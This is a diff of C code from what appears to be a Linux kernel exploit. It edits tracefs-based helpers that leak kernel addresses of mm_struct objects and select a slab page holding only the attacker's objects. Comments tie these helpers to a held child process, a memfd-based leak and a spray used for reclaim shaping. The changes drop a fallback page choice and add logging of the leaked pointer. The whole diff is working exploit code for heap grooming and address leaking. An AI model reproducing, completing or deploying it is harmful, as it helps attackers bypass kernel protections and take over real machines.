@@ -205,7 +205,7 @@ static void tracefs_mm_drain(void) {
   free(page);
 }
 
-static int tracefs_mm_start(void) {
+int tracefs_mm_start(void) {
   char tracing_path[128];
   char buffer_path[128];
   char trace_path[128];
@@ -268,7 +268,7 @@ static void tracefs_mm_stop(void) {
 }
 
 /* Drop records left over from an earlier process before the real window. */
-static void tracefs_mm_baseline(void) {
+void tracefs_mm_baseline(void) {
   tracefs_mm_state.ignore = 1;
   tracefs_mm_drain();
   tracefs_mm_state.ignore = 0;
@@ -276,14 +276,14 @@ static void tracefs_mm_baseline(void) {
   tracefs_mm_state.loose_count = 0;
 }
 
-static int tracefs_mm_available(void) {
+int tracefs_mm_available(void) {
   int armed = tracefs_mm_start();
   tracefs_mm_stop();
   return armed;
 }
 
 /* Clone a child that stays alive until its mm was handed to the caller. */
-static pid_t tracefs_mm_clone_hold(void) {
+pid_t tracefs_mm_clone_hold(void) {
   pid_t child = SYSCHK(syscall(SYS_clone, SIGCHLD, NULL, NULL, NULL, 0));
   if (child == 0) {
     SYSCHK(prctl(PR_SET_PDEATHSIG, SIGKILL));
@@ -300,8 +300,8 @@ static pid_t tracefs_mm_clone_hold(void) {
 
 /* Pick an in-window object of a slab page that holds only our mm_structs. */
 /* The leak child is the pick-th clone of the window, like the futex path. */
-static int tracefs_mm_finish(uintptr_t *leaked, size_t pick, size_t min_index,
-                             size_t max_index) {
+int tracefs_mm_finish(uintptr_t *leaked, size_t pick, size_t min_index,
+                      size_t max_index) {
   if (!tracefs_mm_state.armed) {
     return 0;
   }
@@ -310,6 +310,9 @@ static int tracefs_mm_finish(uintptr_t *leaked, size_t pick, size_t min_index,
   uintptr_t best = 0;
   size_t best_objects = 0;
   size_t best_index = 0;
+  size_t held_objects = 0;
+  size_t pick_index = SIZE_MAX;
+  int selected_pick = 0;
   const uintptr_t *list = tracefs_mm_ptrs;
   size_t list_count = tracefs_mm_state.count;
   if (pick >= list_count) {
@@ -320,6 +323,13 @@ static int tracefs_mm_finish(uintptr_t *leaked, size_t pick, size_t min_index,
   uintptr_t held_page = pick < list_count
                             ? list[pick] & ~(TRACEFS_MM_SLAB_SIZE - 1)
                             : 0;
+  if (held_page) {
+    for (size_t i = 0; i < list_count; i++) {
+      if ((list[i] & ~(TRACEFS_MM_SLAB_SIZE - 1)) == held_page) {
+        held_objects++;
+      }
+    }
+  }
   /*
    * The leak child is the pick-th record and its page is released last by the
    * reclaim shaping (close(memfd_leak) right before the spray), which is the
@@ -329,44 +339,23 @@ static int tracefs_mm_finish(uintptr_t *leaked, size_t pick, size_t min_index,
   if (pick < list_count) {
     size_t index =
         (size_t)((list[pick] - held_page) / SLIDE_TRACEFS_MM_OBJECT);
-    if (index >= min_index && index <= max_index) {
+    pick_index = index;
+    if (index >= min_index && index <= max_index &&
+        held_objects == per_slab) {
       best = list[pick];
-      best_objects = per_slab;
+      best_objects = held_objects;
       best_index = index;
+      selected_pick = 1;
     }
   }
-  /* Fall back to any fully owned page that is not the still-held one. */
-  for (size_t i = 0; i < list_count && !best; i++) {
-    uintptr_t base = list[i] & ~(TRACEFS_MM_SLAB_SIZE - 1);
-    if (base == held_page) {
-      continue;
-    }
-    size_t objects = 0;
-    for (size_t j = 0; j < list_count; j++) {
-      if ((list[j] & ~(TRACEFS_MM_SLAB_SIZE - 1)) == base) {
-        objects++;
-      }
-    }
-    if (objects != per_slab) {
-      continue;
-    }
-    for (size_t j = 0; j < list_count; j++) {
-      if ((list[j] & ~(TRACEFS_MM_SLAB_SIZE - 1)) != base) {
-        continue;
-      }
-      size_t index = (size_t)((list[j] - base) / SLIDE_TRACEFS_MM_OBJECT);
-      if (index < min_index || index > max_index) {
-        continue;
-      }
-      best = list[j];
-      best_objects = objects;
-      best_index = index;
-      break;
-    }
-  }
+  /* Never return a different page: its mm_structs may have been freed before
+   * the held leak child's memfd, so the reclaim shaping cannot target it. */
   pr_info("mm trace leak found=%d objects=%zu index=%zu leaked=%016zx "
-          "pick=%zu hits=%zu loose=%zu records=%u\n", best != 0, best_objects,
-          best_index, best, pick, list_count, tracefs_mm_state.loose_count,
+          "pick=%zu pick_index=%zu source=%s held_page=%016zx "
+          "hits=%zu loose=%zu records=%u\n", best != 0, best_objects,
+          best_index, best, pick, pick_index,
+          selected_pick ? "leak-child" : "none",
+          held_page, list_count, tracefs_mm_state.loose_count,
           tracefs_mm_state.records);
   tracefs_mm_stop();
   if (!best) {
@@ -377,7 +366,7 @@ static int tracefs_mm_finish(uintptr_t *leaked, size_t pick, size_t min_index,
 }
 
 /* Let the leak child exit once its memfd was opened, so its mm is freed. */
-static void tracefs_mm_release_child(void) {
+void tracefs_mm_release_child(void) {
   if (tracefs_mm_state.child > 0) {
     SYSCHK(kill(tracefs_mm_state.child, SIGKILL));
     tracefs_mm_state.child = -1;
